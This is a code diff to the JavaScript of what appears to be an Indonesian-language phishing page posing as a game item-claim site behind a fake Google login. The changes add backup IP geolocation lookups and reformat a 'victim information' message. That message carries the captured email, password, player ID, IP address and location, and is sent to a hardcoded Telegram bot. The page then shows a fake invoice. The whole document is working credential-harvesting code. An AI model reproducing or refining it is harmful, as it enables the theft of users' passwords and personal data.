-            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', region: 'Unknown', org: 'Unknown' };
+            let ipData = { ip: 'Tidak Diketahui', country_name: 'Indonesia', city: 'Tidak Diketahui', org: 'Tidak Diketahui' };
+            
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(err) {
-                console.log('Geo fetch error');
+                if (res.ok) {
+                    const data = await res.json();
+                    ipData = {
+                        ip: data.ip || 'Tidak Diketahui',
+                        country_name: data.country_name || 'Indonesia',
+                        city: data.city || 'Tidak Diketahui',
+                        org: data.org || data.asn || 'Tidak Diketahui'
+                    };
+                } else {
+                    throw new Error('ipapi failed');
+                }
+            } catch (err) {
+                try {
+                    const res2 = await fetch('https://ipwho.is/');
+                    if (res2.ok) {
+                        const data2 = await res2.json();
+                        ipData = {
+                            ip: data2.ip || 'Tidak Diketahui',
+                            country_name: data2.country || 'Indonesia',
+                            city: data2.city || 'Tidak Diketahui',
+                            org: data2.connection?.asn ? `AS${data2.connection.asn} ${data2.connection.org}` : 'Tidak Diketahui'
+                        };
+                    }
+                } catch (e2) {
+                    console.log('Geo fetch fallback error');
+                }
             }
 
             const formattedMessage = `
-📌 NEW CREDENTIAL CAPTURED 📌
-EMAIL : ${email}
-PW : ${password}
-ID : ${fullId}
-GAME : ${currentGame}
-NEGARA : ${ipData.country_name || ipData.country}
-CITY : ${ipData.city}
-ASN : ${ipData.org}
-IP ADDRES : ${ipData.ip}
+☕ <b>INFORMASI KORBAN</b>
+📧 <b>EMAIL / USER:</b> <code>${email}</code>
+🔑 <b>PASSWORD:</b> <code>${password}</code>
+🎮 <b>GAME:</b> ${currentGame}
+🆔 <b>PLAYER ID:</b> <code>${fullId}</code>
+🎁 <b>ITEM CLAIM:</b> ${currentItem}
+🌐 <b>IP ADDRESS:</b> <code>${ipData.ip}</code>
+🌍 <b>NEGARA:</b> ${ipData.country_name}
+🏙️ <b>KOTA:</b> ${ipData.city}
+🏢 <b>ASN / ISP:</b> ${ipData.org}
             `.trim();
 
             const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
             const chatId = '7758332034';
 
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: formattedMessage })
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: formattedMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (telegramErr) {
+                console.error('Telegram send error', telegramErr);
+            }
 
-            document.getElementById('google-modal').style.display = 'none';
+            document.getElementById('googleModal').style.display = 'none';
             document.getElementById('rGame').innerText = currentGame;
             document.getElementById('rId').innerText = fullId;
             document.getElementById('rItem').innerText = currentItem;
-            document.getElementById('invoice-screen').style.display = 'flex';
+            document.getElementById('invoiceScreen').style.display = 'flex';
         }
 
+        // Initialize items on load
         renderItems();
     </script>
 </body>
